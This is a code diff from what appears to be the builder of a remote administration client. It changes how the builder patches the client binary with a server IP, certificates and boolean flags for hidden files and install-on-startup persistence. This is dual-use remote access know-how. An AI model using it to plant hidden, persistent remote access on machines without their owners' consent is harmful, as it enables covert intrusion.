@@ -22,6 +22,12 @@ namespace RemoteAdmin.Server.Build
         private const string INSTALL_NAME_PLACEHOLDER = "###INSTALL_NAME_PLACEHOLDER###";
         private const string STARTUP_NAME_PLACEHOLDER = "###STARTUP_NAME_PLACEHOLDER###";
 
+        // Boolean placeholders - MUST match ClientConfig.cs static fields
+        private const int BOOL_INSTALL_CLIENT_FLAG = 0x11223344;
+        private const int BOOL_SET_FILE_HIDDEN_FLAG = 0x55667788;
+        private const int BOOL_SET_SUBDIR_HIDDEN_FLAG = unchecked((int)0x99AABBCC);
+        private const int BOOL_INSTALL_ON_STARTUP_FLAG = unchecked((int)0xDDEEFF00);
+
         // Certificate chunk placeholders
         private const string CLIENT_PFX_PART1_PREFIX = "###PLACEHOLDER_CLIENT_PFX_PART1_5E4F2C90###";
         private const string CLIENT_PFX_PART2_PREFIX = "###PLACEHOLDER_CLIENT_PFX_PART2_6F5E3D91###";
@@ -52,7 +58,7 @@ namespace RemoteAdmin.Server.Build
                 // ============================================
                 // 1. INJECT CONNECTION SETTINGS
                 // ============================================
-                Console.WriteLine("\n[1/3] Injecting connection settings...");
+                Console.WriteLine("\n[1/4] Injecting connection settings...");
 
                 if (!InjectString(ref fileBytes, IP_PLACEHOLDER, _options.ServerIP))
                     throw new Exception("Failed to inject ServerIP - placeholder not found!");
@@ -69,7 +75,7 @@ namespace RemoteAdmin.Server.Build
                 // ============================================
                 // 2. INJECT INSTALLATION SETTINGS
                 // ============================================
-                Console.WriteLine("\n[2/3] Injecting installation settings...");
+                Console.WriteLine("\n[2/4] Injecting installation settings...");
 
                 if (!InjectString(ref fileBytes, INSTALL_LOCATION_PLACEHOLDER, _options.InstallLocation ?? "AppData"))
                     throw new Exception("Failed to inject InstallLocation - placeholder not found!");
@@ -87,36 +93,39 @@ namespace RemoteAdmin.Server.Build
                     throw new Exception("Failed to inject StartupName - placeholder not found!");
                 Console.WriteLine($"  ✓ Startup Name: {_options.StartupName}");
 
-                // INJECT BOOLEAN FLAGS
-                // Note: Booleans in the template are "false" strings that need to be replaced
-                if (_options.InstallClient)
-                {
-                    ReplaceBoolean(ref fileBytes, "InstallClient = false", "InstallClient = true");
-                    Console.WriteLine($"  ✓ Install Client: true");
-                }
+                // ============================================
+                // 2b. INJECT BOOLEAN FLAGS (STATIC FIELDS)
+                // ============================================
+                Console.WriteLine("\n[2b/4] Injecting boolean flags...");
 
-                if (_options.SetFileHidden)
-                {
-                    ReplaceBoolean(ref fileBytes, "SetFileHidden = false", "SetFileHidden = true");
-                    Console.WriteLine($"  ✓ Set File Hidden: true");
-                }
+                // Replace static field values with 1 (true) or 0 (false)
+                // The comparison happens at RUNTIME: (_boolInstallClientFlag == 1)
+                // So when we replace the flag value, it affects the comparison result
 
-                if (_options.SetSubDirHidden)
-                {
-                    ReplaceBoolean(ref fileBytes, "SetSubDirHidden = false", "SetSubDirHidden = true");
-                    Console.WriteLine($"  ✓ Set SubDir Hidden: true");
-                }
+                int installClientValue = _options.InstallClient ? 1 : 0;
+                if (!InjectInt32(ref fileBytes, BOOL_INSTALL_CLIENT_FLAG, installClientValue))
+                    throw new Exception("Failed to inject InstallClient flag!");
+                Console.WriteLine($"  ✓ Install Client: {_options.InstallClient}");
 
-                if (_options.InstallOnStartup)
-                {
-                    ReplaceBoolean(ref fileBytes, "InstallOnStartup = false", "InstallOnStartup = true");
-                    Console.WriteLine($"  ✓ Install On Startup: true");
-                }
+                int setFileHiddenValue = _options.SetFileHidden ? 1 : 0;
+                if (!InjectInt32(ref fileBytes, BOOL_SET_FILE_HIDDEN_FLAG, setFileHiddenValue))
+                    throw new Exception("Failed to inject SetFileHidden flag!");
+                Console.WriteLine($"  ✓ Set File Hidden: {_options.SetFileHidden}");
+
+                int setSubDirHiddenValue = _options.SetSubDirHidden ? 1 : 0;
+                if (!InjectInt32(ref fileBytes, BOOL_SET_SUBDIR_HIDDEN_FLAG, setSubDirHiddenValue))
+                    throw new Exception("Failed to inject SetSubDirHidden flag!");
+                Console.WriteLine($"  ✓ Set SubDir Hidden: {_options.SetSubDirHidden}");
+
+                int installOnStartupValue = _options.InstallOnStartup ? 1 : 0;
+                if (!InjectInt32(ref fileBytes, BOOL_INSTALL_ON_STARTUP_FLAG, installOnStartupValue))
+                    throw new Exception("Failed to inject InstallOnStartup flag!");
+                Console.WriteLine($"  ✓ Install On Startup: {_options.InstallOnStartup}");
 
                 // ============================================
                 // 3. INJECT CERTIFICATES
                 // ============================================
-                Console.WriteLine("\n[3/3] Injecting certificates...");
+                Console.WriteLine("\n[3/4] Injecting certificates...");
 
                 var clientPfxPath = Path.Combine("Certificates", "client.pfx");
                 var caCrtPath = Path.Combine("Certificates", "ca.crt");
@@ -190,36 +199,6 @@ namespace RemoteAdmin.Server.Build
                 chunks.Add(input.Substring(i, Math.Min(chunkSize, input.Length - i)));
             }
             return chunks;
-        }
-
-        private bool ReplaceBoolean(ref byte[] data, string searchFor, string replaceWith)
-        {
-            try
-            {
-                byte[] searchBytes = Encoding.Unicode.GetBytes(searchFor);
-                byte[] replaceBytes = Encoding.Unicode.GetBytes(replaceWith);
-
-                int index = FindPattern(data, searchBytes);
-                if (index == -1)
-                    return false;
-
-                if (replaceBytes.Length > searchBytes.Length)
-                    throw new Exception($"Replacement text is longer than original!");
-
-                Array.Copy(replaceBytes, 0, data, index, replaceBytes.Length);
-
-                // Null-pad remaining space
-                for (int i = replaceBytes.Length; i < searchBytes.Length; i++)
-                {
-                    data[index + i] = 0;
-                }
-
-                return true;
-            }
-            catch
-            {
-                return false;
-            }
         }
 
         private bool InjectStringWithPadding(ref byte[] data, string prefix, string value, int paddingSize)
